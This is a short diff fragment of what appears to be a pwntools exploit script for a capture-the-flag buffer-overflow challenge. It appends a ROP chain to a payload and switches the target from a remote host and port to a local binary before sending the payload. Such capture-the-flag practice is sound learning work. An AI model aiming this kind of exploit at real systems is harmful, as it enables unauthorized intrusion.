@@ -20,8 +20,8 @@ vuln_rop.call("main")
 payload += vuln_rop.chain()
 
 
-p = remote("13.214.30.13", 10009)
-# p = process('./bof8')
+#p = remote("13.214.30.13", 10009)
+p = process('./bof8')
 
 p.recvline()
 p.sendline(payload)
